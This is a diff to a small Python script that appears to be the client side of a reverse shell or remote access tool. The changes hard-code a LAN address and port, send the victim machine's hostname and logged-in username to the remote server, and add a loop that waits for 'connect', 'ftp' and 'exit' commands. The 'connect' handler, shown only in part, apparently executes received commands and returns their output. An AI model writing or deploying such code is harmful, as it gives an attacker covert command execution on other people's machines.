@@ -1,17 +1,21 @@
-import  socket
+import socket
 import os
 import subprocess
+import getpass
 
-
-HOST = "127.0.0.1"
+HOST = "192.168.30.52"
 PORT = 6565
 
 
 
 
-client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-client.connect((HOST,PORT))
-
+def first_connect(client):
+    client.send(socket.gethostname().encode('utf-8'))
+    answer = client.recv(1024).decode("utf-8")
+    if answer == "whoareyou":
+        client.send(getpass.getuser().encode("utf-8"))
+    else :
+        print("hello")
 
 
 def connect():
@@ -31,14 +35,24 @@ def connect():
             client.send(stdout)
         else:
             client.send(b"\n")
+    
 
+def ftp():
+    True
+
+
+
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client.connect((HOST,PORT))
+first_connect(client)
 while 1:
     command = client.recv(40960).decode("utf-8")
     match command:
             case "connect":
                 connect()
-
-client.close()
-
-
+            case "ftp":
+                ftp()
+            case "exit":
+                client.close()
+                break
 
